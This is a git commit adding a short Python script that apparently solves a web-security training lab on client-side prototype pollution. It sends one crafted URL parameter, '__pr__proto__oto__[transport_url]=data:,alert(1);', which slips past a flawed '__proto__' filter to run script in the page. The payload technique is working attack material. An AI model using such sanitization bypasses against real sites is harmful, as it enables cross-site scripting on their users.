724d7ab4b1f2a048410bb8f72eb46dd3c2a58ed4
Kuro-orzz <23020674@vnu.edu.vn>
2026-08-10 15:58:56 +0700

    update Prototype Pollution (part 1)

---
+++ Advanced_topics/Prototype_pollution/04_Client_side_prototype_pollution_via_flawed_sanitization/attack.py
@@ -0,0 +1,44 @@
+import requests
+from requests_toolbelt.adapters.host_header_ssl import HostHeaderSSLAdapter
+import sys
+import urllib3
+import time
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore
+
+# Burp Suite proxy
+proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080',  
+}
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
+}
+
+
+def goto(s, url, path, headers=headers, cookies={}):
+    target_url = url + path
+    s.get(target_url, headers=headers, cookies=cookies)
+
+def check_solved_lab(s, url):
+    r = s.get(url)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("[+] Successful solved lab")
+        sys.exit(0)
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+
+    s = requests.Session()
+    url = sys.argv[1].rstrip('/')
+
+    goto(s, url, '/?__pr__proto__oto__[transport_url]=data:,alert(1);')
+    check_solved_lab(s, url)
+
+if __name__ == '__main__':
+    main()
